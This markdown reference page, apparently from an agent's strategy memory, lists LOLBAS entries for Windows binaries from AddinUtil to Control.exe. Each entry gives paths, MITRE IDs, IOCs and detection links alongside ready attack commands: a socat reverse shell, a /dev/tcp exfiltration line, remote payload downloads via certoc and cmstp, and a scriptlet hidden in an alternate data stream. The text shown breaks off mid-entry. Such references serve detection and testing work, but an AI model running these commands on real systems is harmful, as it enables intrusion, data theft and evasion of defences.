---
title: lolbins_os_binaries_a_to_l
category: reasoning
engine: team_strategy_arbiter
team_role: lolbins
os_platform: windows
domain_hub: "[[reasoning/LOLBINS]]"
primary_tactic: Defense_Evasion_Firewall
summary: "LOLBINS Windows Native OS Binaries (A–L, 51 binaries): Complete Living Off The Land Binaries reference from https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries covering Addinutil.exe through Ldifde.exe (including At.exe, Bitsadmin.exe, Certoc.exe, Certreq.exe, Certutil.exe, Cmd.exe, Cmdkey.exe, Cmstp.exe, Conhost.exe, Control.exe, Csc.exe, Cscript.exe, Desktopimgdownldr.exe, Diantz.exe, Diskshadow.exe, Esentutl.exe, Eventvwr.exe, Expand.exe, Extrac32.exe, Findstr.exe, Finger.exe, FltMC.exe, Forfiles.exe, Ftp.exe, Gpscript.exe, Hh.exe, Ie4uinit.exe, Ilasm.exe, Infdefaultinstall.exe, Installutil.exe, Jsc.exe, Ldifde.exe) with exact commands, MITRE ATT&CK IDs, IOCs, and Sigma detections."
when_to_apply: "Apply when executing, auditing, or hunting Windows Living Off The Land OS binaries (A–L) such as certutil, bitsadmin, cmstp, cmdkey, csc, cscript, diskshadow, esentutl, eventvwr, expand, extrac32, findstr, fltmc, forfiles, ftp, hh, installutil, or ldifde."
tags: [reasoning, lolbins, lolbas, osbinaries, windows, living-off-the-land, certutil, bitsadmin, cmstp, cmdkey, cscript, diskshadow, esentutl, eventvwr, findstr, forfiles, installutil, ldifde, red-team, hunt-team, blue-team]
updated: 2026-11-01 01:10:00
---
# LOLBINS — Windows Native OS Binaries (`A–L`, 51 Binaries)

> **Parent Section Hub:** [[reasoning/LOLBINS]]  
> **Official Repository:** [`https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries)  
> **Sibling Playbooks:** [[reasoning/LOLBINS/lolbins_os_binaries_m_to_z]] | [[reasoning/LOLBINS/lolbins_os_scripts_and_libraries]] | [[reasoning/LOLBINS/lolbins_other_ms_binaries]] | [[reasoning/LOLBINS/lolbins_tactical_categories_and_detections]]  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[reasoning/red_team_strategy_playbook]] | [[reasoning/hunt_team_strategy_playbook]] | [[reasoning/blue_team_strategy_playbook]]

---

## Complete Windows OS Binaries (`A–L`) Reference

### `AddinUtil.exe` (`yml/OSBinaries/Addinutil.yml`)
- **Description:** .NET Tool used for updating cache files for Microsoft Office Add-Ins.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Addinutil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Addinutil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Addinutil.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddinUtil.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_suspicious_cmdline.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_child_process.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_cmdline.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_dir_exec.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.` | Proxy execution of malicious serialized payload |

### `AppInstaller.exe` (`yml/OSBinaries/AppInstaller.yml`)
- **Description:** Tool used for installation of AppX/MSIX applications on Windows 10
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/AppInstaller.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/AppInstaller.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/AppInstaller.yml`
- **Default Windows Paths:** `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw` | Download file from Internet |

### `Aspnet_Compiler.exe` (`yml/OSBinaries/Aspnet_Compiler.yml`)
- **Description:** ASP.NET Compilation Tool
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Aspnet_Compiler.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Aspnet_Compiler.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Aspnet_Compiler.yml`
- **Default Windows Paths:** `c:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe`, `c:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe`
- **Detection Rules:** [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_aspnet_compiler.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127` | `User` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u` | Execute proxied payload with Microsoft signed binary to bypass application control solutions |

### `At.exe` (`yml/OSBinaries/At.yml`)
- **Description:** Schedule periodic tasks
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/At.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/At.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/At.yml`
- **Default Windows Paths:** `C:\WINDOWS\System32\At.exe`, `C:\WINDOWS\SysWOW64\At.exe`
- **Key Forensic / Hunt IOCs:** `C:\Windows\System32\Tasks\At1 (substitute 1 with subsequent number of at job)`; `C:\Windows\Tasks\At1.job`; `Registry Key - Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\At1.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_at_interactive_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/network/zeek/zeek_smb_converted_win_atsvc_task.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/builtin/security/win_security_atsvc_task.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1053.002` | `Local Admin` | `C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe` | Create a recurring task, to eg. to keep reverse shell session(s) alive |

### `Atbroker.exe` (`yml/OSBinaries/Atbroker.yml`)
- **Description:** Helper binary for Assistive Technology (AT)
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Atbroker.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Atbroker.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Atbroker.yml`
- **Default Windows Paths:** `C:\Windows\System32\Atbroker.exe`, `C:\Windows\SysWOW64\Atbroker.exe`
- **Key Forensic / Hunt IOCs:** `Changes to HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\Configuration`; `Changes to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`; `Unknown AT starting C:\Windows\System32\ATBroker.exe /start malware`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_atbroker.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/registry/registry_event/registry_event_susp_atbroker_change.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `ATBroker.exe /start malware` | Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry. |

### `Bash.exe` (`yml/OSBinaries/Bash.yml`)
- **Description:** File used by Windows subsystem for Linux
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Bash.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Bash.yml`
- **Default Windows Paths:** `C:\Windows\System32\bash.exe`, `C:\Windows\SysWOW64\bash.exe`
- **Key Forensic / Hunt IOCs:** `Child process from bash.exe`
- **Detection Rules:** [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `bash.exe -c calc.exe` | Performs execution of specified file, can be used as a defensive evasion. |
| **Execute** | `T1202` | `User` | `bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"` | Performs execution of specified file, can be used as a defensive evasion. |
| **Execute** | `T1202` | `User` | `bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'` | Performs execution of specified file, can be used as a defensive evasion. |
| **AWL Bypass** | `T1202` | `User` | `bash.exe -c calc.exe` | Performs execution of specified file, can be used to bypass Application Whitelisting. |

### `Bitsadmin.exe` (`yml/OSBinaries/Bitsadmin.yml`)
- **Description:** Used for managing background intelligent transfer
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Bitsadmin.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Bitsadmin.yml`
- **Default Windows Paths:** `C:\Windows\System32\bitsadmin.exe`, `C:\Windows\SysWOW64\bitsadmin.exe`
- **Key Forensic / Hunt IOCs:** `Child process from bitsadmin.exe`; `bitsadmin creates new files`; `bitsadmin adds data to alternate data stream`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/web/proxy_generic/proxy_ua_bitsadmin_susp_tld.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml), [Splunk](https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1` | Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique. |
| **Download** | `T1105` | `User` | `bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1` | Download file from Internet |
| **Copy** | `T1105` | `User` | `bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset` | Copy file |
| **Execute** | `T1218` | `User` | `bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset` | Execute binary file specified. Can be used as a defensive evasion. |

### `CertOC.exe` (`yml/OSBinaries/Certoc.yml`)
- **Description:** Used for installing certificates
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Certoc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Certoc.yml`
- **Default Windows Paths:** `c:\windows\system32\certoc.exe`, `c:\windows\syswow64\certoc.exe`
- **Key Forensic / Hunt IOCs:** `Process creation with given parameter`; `Unsigned DLL load via certoc.exe`; `Network connection via certoc.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `certoc.exe -LoadDLL "C:\test\calc.dll"` | Execute code within DLL file |
| **Download** | `T1105` | `User` | `certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1` | Download scripts, webshells etc. |

### `CertReq.exe` (`yml/OSBinaries/Certreq.yml`)
- **Description:** Used for requesting and managing certificates
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Certreq.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Certreq.yml`
- **Default Windows Paths:** `C:\Windows\System32\certreq.exe`, `C:\Windows\SysWOW64\certreq.exe`
- **Key Forensic / Hunt IOCs:** `certreq creates new files`; `certreq makes POST requests`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | Download file from Internet |
| **Upload** | `T1105` | `User` | `CertReq -Post -config https://example.org/ c:\windows\win.ini` | Upload |

### `Certutil.exe` (`yml/OSBinaries/Certutil.yml`)
- **Description:** Windows binary used for handling certificates
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Certutil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Certutil.yml`
- **Default Windows Paths:** `C:\Windows\System32\certutil.exe`, `C:\Windows\SysWOW64\certutil.exe`
- **Key Forensic / Hunt IOCs:** `Certutil.exe creating new files on disk`; `Useragent Microsoft-CryptoAPI/10.0`; `Useragent CertUtil URL Agent`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml), [Elastic](https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe` | Download file from Internet |
| **Download** | `T1105` | `User` | `certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe` | Download file from Internet |
| **ADS** | `T1564.004` | `User` | `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt` | Download file from Internet and save it in an NTFS Alternate Data Stream |
| **Encode** | `T1027.013` | `User` | `certutil -encode inputFileName encodedOutputFileName` | Encode files to evade defensive measures |
| **Decode** | `T1140` | `User` | `certutil -decode encodedInputFileName decodedOutputFileName` | Decode files to evade defensive measures |
| **Decode** | `T1140` | `User` | `certutil -decodehex encoded_hexadecimal_InputFileName decodedOutputFileName` | Decode files to evade defensive measures |

### `Cmd.exe` (`yml/OSBinaries/Cmd.yml`)
- **Description:** The command-line interpreter in Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Cmd.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Cmd.yml`
- **Default Windows Paths:** `C:\Windows\System32\cmd.exe`, `C:\Windows\SysWOW64\cmd.exe`
- **Key Forensic / Hunt IOCs:** `cmd.exe executing files from alternate data streams.`; `cmd.exe creating/modifying file contents in an alternate data stream.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **ADS** | `T1059.003` | `User` | `cmd.exe - < fakefile.doc:payload.bat` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **Download** | `T1105` | `User` | `type \\webdav-server\folder\file.ext > C:\Path\file.ext` | Download/copy a file from a WebDAV server |
| **Upload** | `T1048.003` | `User` | `type C:\Path\file.ext > \\webdav-server\folder\file.ext` | Upload a file to a WebDAV server |

### `Cmdkey.exe` (`yml/OSBinaries/Cmdkey.yml`)
- **Description:** creates, lists, and deletes stored user names and passwords or credentials.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Cmdkey.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Cmdkey.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Cmdkey.yml`
- **Default Windows Paths:** `C:\Windows\System32\cmdkey.exe`, `C:\Windows\SysWOW64\cmdkey.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmdkey_recon.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Credentials** | `T1078` | `User` | `cmdkey /list` | Get credential information from host |

### `cmdl32.exe` (`yml/OSBinaries/Cmdl32.yml`)
- **Description:** Microsoft Connection Manager Auto-Download
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Cmdl32.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Cmdl32.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Cmdl32.yml`
- **Default Windows Paths:** `C:\Windows\System32\cmdl32.exe`, `C:\Windows\SysWOW64\cmdl32.exe`
- **Key Forensic / Hunt IOCs:** `Reports of downloading from suspicious URLs in %TMP%\config.log`; `Useragent Microsoft(R) Connection Manager Vpn File Update`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_cmdl32.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `cmdl32 /vpn /lan %cd%\config` | Download file from Internet |

### `Cmstp.exe` (`yml/OSBinaries/Cmstp.yml`)
- **Description:** Installs or removes a Connection Manager service profile.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Cmstp.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Cmstp.yml`
- **Default Windows Paths:** `C:\Windows\System32\cmstp.exe`, `C:\Windows\SysWOW64\cmstp.exe`
- **Key Forensic / Hunt IOCs:** `Execution of cmstp.exe without a VPN use case is suspicious`; `DotNet CLR libraries loaded into cmstp.exe`; `DotNet CLR Usage Log - cmstp.exe.log`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml), [Splunk](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml), [Elastic](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.003` | `User` | `cmstp.exe /ni /s c:\cmstp\CorpVPN.inf` | Execute code hidden within an inf file. Download and run scriptlets from internet. |
| **AWL Bypass** | `T1218.003` | `User` | `cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf` | Execute code hidden within an inf file. Execute code directly from Internet. |

### `Colorcpl.exe` (`yml/OSBinaries/Colorcpl.yml`)
- **Description:** Binary that handles color management
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Colorcpl.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Colorcpl.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Colorcpl.yml`
- **Default Windows Paths:** `C:\Windows\System32\colorcpl.exe`, `C:\Windows\SysWOW64\colorcpl.exe`
- **Key Forensic / Hunt IOCs:** `colorcpl.exe writing files`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_susp_colorcpl.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Copy** | `T1036.005` | `User` | `colorcpl file.txt` | Copies file(s) to a subfolder of a generally trusted folder (c:\Windows\System32), which can be used to hide files or make them blend into the environment. |

### `ConfigSecurityPolicy.exe` (`yml/OSBinaries/ConfigSecurityPolicy.yml`)
- **Description:** Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/ConfigSecurityPolicy.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/ConfigSecurityPolicy.yml`
- **Default Windows Paths:** `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe`, `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`
- **Key Forensic / Hunt IOCs:** `ConfigSecurityPolicy storing data into alternate data streams.`; `Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.`; `Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.`; `User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Upload** | `T1567` | `User` | `ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile` | Upload file |
| **Download** | `T1105` | `User` | `ConfigSecurityPolicy.exe https://example.com/payload` | Downloads payload from remote server |

### `Conhost.exe` (`yml/OSBinaries/Conhost.yml`)
- **Description:** Console Window host
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Conhost.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Conhost.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Conhost.yml`
- **Default Windows Paths:** `c:\windows\system32\conhost.exe`
- **Key Forensic / Hunt IOCs:** `conhost.exe spawning unexpected processes`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_conhost_susp_child_process.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `conhost.exe calc.exe` | Use conhost.exe as a proxy binary to evade defensive counter-measures |
| **Execute** | `T1202` | `User` | `conhost.exe --headless calc.exe` | Specify --headless parameter to hide child process window (if applicable) |

### `Control.exe` (`yml/OSBinaries/Control.yml`)
- **Description:** Binary used to launch controlpanel items in Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Control.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Control.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Control.yml`
- **Default Windows Paths:** `C:\Windows\System32\control.exe`, `C:\Windows\SysWOW64\control.exe`
- **Key Forensic / Hunt IOCs:** `Control.exe executing files from alternate data streams`; `Control.exe executing library file without cpl extension`; `Suspicious network connections from control.exe`
